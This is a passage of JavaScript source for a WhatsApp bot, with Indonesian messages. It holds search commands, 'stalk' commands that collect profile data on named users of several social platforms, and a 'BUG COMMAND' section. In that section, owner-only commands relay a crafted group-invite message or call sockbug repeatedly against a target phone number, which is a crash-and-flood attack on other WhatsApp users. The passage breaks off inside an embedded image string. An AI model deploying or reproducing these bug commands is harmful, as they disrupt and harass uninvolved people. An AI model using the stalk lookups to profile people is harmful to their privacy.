            case 'gimage': {
              if (!text) return reply(`Contoh: ${cmd} Vynaa`)
              xreact()

              try {
                const {
                  gimage
                } = require('./lib-signal/data-utils/scrape')
                const images = await gimage(text)
                if (!images.length) return reply('Gambar tidak ditemukan')

                const randomImage = images[Math.floor(Math.random() * images.length)].link

                const buttons = [{
                  buttonId: `${_p}gimage ${text}`,
                  buttonText: {
                    displayText: 'Next'
                  },
                  type: 1
                }]

                await sock.sendMessage(m.chat, {
                  image: {
                    url: randomImage
                  },
                  caption: 'Lanjut mencari gambar yang sama? Klik tombol *Next* dibawah ini',
                  buttons,
                  headerType: 1,
                  viewOnce: true
                }, {
                  quoted: fakeQuoted
                })
              } catch (err) {
                reply(`Terjadi kesalahan: ${err}`)
              }
            }
            break

            case 'bingsrc':
            case 'bingsearch': {
              try {
                if (!text) return reply(`Contoh: ${cmd} mbappe`)
                let {
                  data
                } = await axios.get(`https://fastrestapis.fasturl.link/search/bingsearch?ask=${text}`)
                if (!data.result || data.result.length === 0) return reply('Tidak ada hasil yang ditemukan.')

                let allResults = data.result.map(kep =>
                  `*Title:* ${kep.title}\n*Desc:* ${kep.description}\n*Link:* ${kep.link}`
                ).join('\n\n')

                reply(allResults)
              } catch (err) {
                reply('Terjadi kesalahan: ' + err)
              }
            }
            break

            case 'bingimg':
            case 'bingimage': {
              try {
                if (!text) return reply(`Contoh: ${cmd} mbappe`)
                let {
                  data
                } = await axios.get(`https://fastrestapis.fasturl.link/search/bingimage?ask=${text}`)
                if (!data.result || data.result.length === 0) return reply('Tidak ada gambar yang ditemukan.')

                let allResults = data.result.map(kep =>
                  `*Title:* ${kep.title}\n*Image:* ${kep.imageUrl}\n*Thumbnail:* ${kep.thumbnailUrl}\n*Page:* ${kep.pageUrl}`
                ).join('\n\n')

                reply(allResults)
              } catch (err) {
                reply('Terjadi kesalahan: ' + err)
              }
            }
            break

            case 'bingvd':
            case 'bingvidio':
            case 'bingvideo': {
              try {
                if (!text) return reply(`Contoh: ${cmd} mbappe`)
                let results = await fetchJson(`https://vapis.my.id/api/bingsrc?q=${text}`)
                let allResults = results.data.map(kep => {
                  return `Judul: ${kep.title}\nDurasi: ${kep.duration}\nPenonton: ${kep.views}\nChannel: ${kep.channel}\nLink: ${kep.link}\n`
                }).join('\n')

                sock.sendMessage(m.chat, {
                  text: allResults
                }, {
                  quoted: fakeQuoted
                })
              } catch (err) {
                reply('Terjadi kesalahan: ' + err)
                console.error('Error:', err)
              }
            }
            break

            case 'yts':
            case 'ytplay':
            case 'play':
            case 'song':
            case 'ytsearch': {
              if (!text) return reply(`Contoh: ${cmd} aku yang tersakiti`)
              try {
                xreact()
                let results = await yt_search(text)
                if (!results.length) return reply('Tidak ditemukan hasil untuk pencarianmu.')

                let teks = `*YOUTUBE - SEARCH*\n\nHasil pencarian untuk: *${kapital(text)}*\n\n`
                for (let i = 0; i < results.length && i < 10; i++) {
                  let vid = results[i]
                  teks += `ğŸ¬ *${vid.title}*\n`
                  teks += `ğŸ‘¤ Channel: ${vid.author}\n`
                  teks += `â±ï¸ Durasi: ${vid.duration}\n`
                  teks += `ğŸ“… Upload: ${vid.ago}\n`
                  teks += `ğŸ‘ï¸ Views: ${toRupiah(vid.views)}\n`
                  teks += `ğŸ”— Link: ${vid.url}\n\n`
                }

                sock.sendMessage(m.chat, {
                  image: {
                    url: results[0].thumbnail
                  },
                  caption: teks
                }, {
                  quoted: fakeQuoted
                })
              } catch (err) {
                console.error(err)
                reply(`Terjadi kesalahan saat mencari video.\n\n${err.message}`)
              }
            }
            break
            
            /* STALK MENU*/
case 'tiktokstalk':
case 'stalktt':
case 'stalktiktok':
case 'ttstalk': {
  try {
    React()
    if (!text) return reply(`Contoh:\n${prefix + command} justme.paul1`)

    const username = text.replace('@', '').trim()
    const url = `https://api.baguss.xyz/api/stalker/tiktok?username=${encodeURIComponent(username)}`

    const { data } = await axios.get(url)
    if (!data.status) return reply('Gagal mengambil data TikTok.')

    const user = data.user.user
    const stats = data.user.stats

    let caption = `ä¹‚ *TIKTOK STALK*\n\n`
    caption += `â€¢ *Username* : @${user.uniqueId}\n`
    caption += `â€¢ *Nickname* : ${user.nickname}\n`
    caption += `â€¢ *Bio* : ${user.signature || '-'}\n`
    caption += `â€¢ *Verified* : ${user.verified ? 'Ya' : 'Tidak'}\n`
    caption += `â€¢ *Private* : ${user.privateAccount ? 'Ya' : 'Tidak'}\n`
    caption += `â€¢ *Followers* : ${stats.followerCount}\n`
    caption += `â€¢ *Following* : ${stats.followingCount}\n`
    caption += `â€¢ *Likes* : ${stats.heartCount}\n`
    caption += `â€¢ *Video* : ${stats.videoCount}\n`
    caption += `â€¢ *Friend* : ${stats.friendCount}\n`
    caption += `â€¢ *Language* : ${user.language}\n`
    caption += `â€¢ *User ID* : ${user.id}\n`

    await sock.sendMessage(m.chat, {
      image: { url: user.avatarLarger },
      caption
    }, { quoted: fakeQuoted })

  } catch (err) {
    console.error(err)
    reply('Terjadi kesalahan saat stalk TikTok.')
  }
}
break
            case 'stalkwa':
            case 'whatsappstalk':
            case 'stalkwhatsapp':
            case 'wastalk' : {
const PhoneNum = require('awesome-phonenumber')
React()          
let regionNames = new Intl.DisplayNames(['en'], { type: 'region' })
	let num = m.quoted?.sender || m.mentionedJid?.[0] || text
	if (!num) return reply(`*â€¢ Example:* ${cmd} *[Number]*`)
	num = num.replace(/\D/g, '') + '@s.whatsapp.net'
	if (!(await sock.onWhatsApp(num))[0]?.exists) return reply('User not exists')
	let img = await sock.profilePictureUrl(num, 'image').catch(_ => 'https://files.catbox.moe/nwvkbt.png')
	let bio = await sock.fetchStatus(num).catch(_ => { })
	let name = await sock.getName(num)
	let business = await sock.getBusinessProfile(num)
	let format = PhoneNum(`+${num.split('@')[0]}`)
	let country = regionNames.of(format.getRegionCode('international'))
	let wea = `*[ WhatsApp Stalk ]*\n\n*Â° Country :* ${country.toUpperCase()}\n*Â° Name :* ${name ? name : '-'}\n*Â° Format Number :* ${format.getNumber('international')}\n*Â° Url Api :* wa.me/${num.split('@')[0]}\n*Â° Mentions :* @${num.split('@')[0]}\n*Â° Status :* ${bio?.status || '-'}\n*Â° Date Status :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `*[ WhatsApp Business Stalk ]*\n\n*Â° BusinessId :* ${business.wid}\n*Â° Website :* ${business.website ? business.website : '-'}\n*Â° Email :* ${business.email ? business.email : '-'}\n*Â° Category :* ${business.category}\n*Â° Address :* ${business.address ? business.address : '-'}\n*Â° Timeone :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*Â° Descripcion* : ${business.description ? business.description : '-'}` : '*Standard WhatsApp Account*'}`
	img ? await sock.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: fakeQuoted }) : reply(wea)
}
break
            case 'stalkig':
            case 'instagramstalk':
            case 'stalkinstagram':
            case 'igstalk': {
    if (!text) return reply(`Masukkan username Instagram!\nContoh: ${prefix}igstalk ryzz2.009`);
    
    try {
        let username = text;
        let res = await fetch(`https://api.zenzxz.my.id/api/stalker/instagram?username=${username}`);
        let json = await res.json();

        if (!json.success) return reply(`User tidak ditemukan!`);

        let data = json.data;
        let caption = `
*Instagram Stalker Info*
â€¢ Username: ${data.username}
â€¢ Name: ${data.name}
â€¢ Bio: ${data.bio || '-'}
â€¢ Followers: ${data.followers}
â€¢ Following: ${data.following}
â€¢ Posts: ${data.posts}
â€¢ Verified: ${data.verified ? 'âœ…' : 'âŒ'}
â€¢ Engagement Rate: ${data.engagement_rate}
`;

        // Kirim foto profil dengan info
        await sock.sendMessage(m.chat, {
            image: { url: data.profile_pic },
            caption: caption
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengambil data Instagram.');
    }
}
break;
case 'stalkroblox':
case 'robloxstalk': {
    if (!text) return reply(`Masukkan username Roblox!\nContoh: ${prefix}robloxstalk KACUNG`);

    try {
        let username = text;
        let res = await fetch(`https://api.zenzxz.my.id/api/stalker/roblox?user=${username}`);
        let json = await res.json();

        if (!json.success) return reply('User Roblox tidak ditemukan!');

        let data = json.data;
        let basic = data.basic;
        let presence = data.presence.userPresences[0] || {};
        let social = data.social;
        let avatar = data.avatar.headshot.data[0]; // pakai headshot sebagai thumbnail

        let caption = `
*Roblox User Info*
â€¢ Name: ${basic.name}
â€¢ Display Name: ${basic.displayName}
â€¢ User ID: ${basic.id}
â€¢ Description: ${basic.description || '-'}
â€¢ Created: ${new Date(basic.created).toLocaleDateString()}
â€¢ Banned: ${basic.isBanned ? 'âœ…' : 'âŒ'}
â€¢ Verified: ${basic.hasVerifiedBadge ? 'âœ…' : 'âŒ'}
â€¢ Last Location: ${presence.lastLocation || '-'}
â€¢ Friends: ${social.friends.count}
â€¢ Followers: ${social.followers.count}
â€¢ Following: ${social.following.count}
`;

        // Kirim foto avatar headshot dengan info
        await sock.sendMessage(m.chat, {
            image: { url: avatar.imageUrl },
            caption: caption
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengambil data Roblox.');
    }
}
break;
case 'twiterstalk':
case 'stalktwiter':
case 'stalktw':
case 'twstalk': {
    if (!text) return reply(`Masukkan username Twitter!\nContoh: ${prefix}twstalk ale`);
    
    try {
        let username = text;
        let res = await fetch(`https://api.zenzxz.my.id/api/stalker/twitter?username=${username}`);
        let json = await res.json();

        if (!json.success) return reply('User Twitter tidak ditemukan!');

        let user = json.data.user;
        let tweets = json.data.tweetList.tweets.slice(0, 5); // ambil 5 tweet terbaru
        let caption = `
*Twitter Stalker Info*
â€¢ Name: ${user.name}
â€¢ Username: @${user.screen_name}
â€¢ Bio: ${user.description || '-'}
â€¢ Verified: ${user.is_blue_verified ? 'âœ…' : 'âŒ'}
`;

        // Tambahkan daftar tweet terbaru
        caption += `\n*Latest Tweets:*\n`;
        tweets.forEach((t, i) => {
            caption += `\n${i + 1}. ${t.full_text}\nRetweets: ${t.retweet_count}, Likes: ${t.favorite_count}\n`;
        });

        // Kirim foto profil dengan info
        await sock.sendMessage(m.chat, {
            image: { url: user.profile_image_url_https },
            caption: caption
        });

    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengambil data Twitter.');
    }
}
break;
case 'stalkyt':
case 'ytstalk':
case 'youtubestalk':
case 'stalkyoutube': {
    if (!text) return reply(`Masukkan username YouTube!\nContoh: ${prefix}ytstalk alex`);
    
    try {
        let username = text;
        let res = await fetch(`https://api.zenzxz.my.id/api/stalker/youtube?username=${username}`);
        let json = await res.json();

        if (!json.success) return reply('User YouTube tidak ditemukan!');

        let channel = json.data.channel;
        let latest = json.data.latest_videos;

        let caption = `
*YouTube Stalker Info*
â€¢ Username: ${channel.username}
â€¢ Subscribers: ${channel.subscriberCount || '-'}
â€¢ Videos: ${channel.videoCount || '-'}
â€¢ Description: ${channel.description || '-'}
â€¢ Channel URL: ${channel.channelUrl}
`;

        if (latest.length > 0) {
            caption += `\n*Latest Videos:*\n`;
            latest.slice(0, 5).forEach((vid, i) => {
                caption += `\n${i + 1}. ${vid.title}\n${vid.url}\n`;
            });
        } else {
            caption += `\nTidak ada video terbaru.`;
        }

        // Kirim foto avatar dengan info
        await sock.sendMessage(m.chat, {
            image: { url: channel.avatarUrl },
            caption: caption
        });

    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengambil data YouTube.');
    }
}
break;

        //â–¢â”â”â”â”â”â”â”â”â”ã€Œ BUG COMMAND ã€â”â”â”â”â”â”â”â”â”â–¢
        
        case 'bugs': {
          if (!isOwner) return reply(mess.owner)
          Pe = m.chat
          if (global.owner.includes(Pe)) return reply('Tidak Dapat Melakukannya Kepada Owner')
          try {
            var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
              "groupInviteMessage": {
                "groupJid": "6288239620884-1626256984@g.us",
                "inviteCode": "sfeVFOlWvlo5Hd9x",
                "inviteExpiration": "166659839399999",
                "groupName": `ğ‘ªğ‘¶ğ‘´ğ‘¼ğ‘µğ‘°ğ‘»ğ’€ ğ‘ªğ‘³ğ‘¨ğ’€(ğ‘ªğ’ğ’ğ’˜ğ’ğ’” ğ‘³ğ’‚ğ’–ğ’ˆğ’‰ ğ‘¨ğ’• ğ’€ğ’ğ’–)Â©ï¸`,
                "jpegThumbnail": "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",
                "caption": `${command}\n*https://wa.me/settings*\n${botName}`,
              }
            }), {
              userJid: Pe,
              quoted: fakeQuoted
            })
            if (args.length == 0) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
            jumlah = `${encodeURI(q)}`
            for (let i = 0; i < jumlah; i++) {
              sock.relayMessage(Pe, groupInvite.message, {
                messageId: groupInvite.key.id
              })
              await sleep(2000)
            }
          } catch (err) {
            reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        case "xvir":
        case 'xstik':
        case "xlist":
        case "xbutton":
        case "x24j":
        case "xuia":
        case "xlec":
        case "xforce":
        case "xva":
        case "xta":
        case "xcrash":
        case "xbom":
        case "xbug":
        case "xkill":
        case "xloc":
        case "xdoc":
        case 'xhit': {
          if (!isOwner) return reply(mess.owner)
          let good = text.split(',');
          if (good.length < 2) return reply(`*Masukan Input Dengan Benar!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          if (isNaN(good[0])) return reply(`*Nomor Harus Berupa Angka!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          if (!good[0]) return reply(`*Masukan Nombor!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          if (!good[1]) return reply(`*Masukan Jumlah Yang Dikirim!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          if (isNaN(good[1])) return reply(`*Jumlah Bug Harus Berupa Angka!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          let onlen = await sock.onWhatsApp(good[0])
          if (onlen.length == 0) return reply('*Nomor Tersebut Tidak Ada Di WhatsApp!*')
          try {
            reply(`*[ </> ]* Mengirimkan ${command}...`)
            await sleep(1000)
            sockbug(onlen[0].jid, good[1])
            await sleep(2000)
            reply(`*[ </> ]* Done sent!`)
          } catch (err) {
            reply('Terjadi kesalahan: ' + err)
          }
        }
        break

        case 'delay':
        case 'delayv2':
        case 'delayv3':
        case 'delayv4':
        case 'delayv5':
        case 'delayv6':
        case 'delayv7':
        case 'delayv8':
        case 'delayv9':
        case 'delayv10':
        case 'bugurl':
        case 'buglink': {
          if (!isOwner) return reply(mess.owner)
          if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
          Pe = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          if (global.owner.includes(Pe)) return reply('Tidak Dapat Melakukannya Kepada Owner')
          try {
            var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
              "groupInviteMessage": {
                "groupJid": "6288239620884-1626256984@g.us",
                "inviteCode": "sfeVFOlWvlo5Hd9x",
                "inviteExpiration": "166659839399999",
                "groupName": `ğ‘ªğ‘¶ğ‘´ğ‘¼ğ‘µğ‘°ğ‘»ğ’€ ğ‘ªğ‘³ğ‘¨ğ’€(ğ‘ªğ’ğ’ğ’˜ğ’ğ’” ğ‘³ğ’‚ğ’–ğ’ˆğ’‰ ğ‘¨ğ’• ğ’€ğ’ğ’–)Â©ï¸${(prefix)}`,
                "jpegThumbnail": "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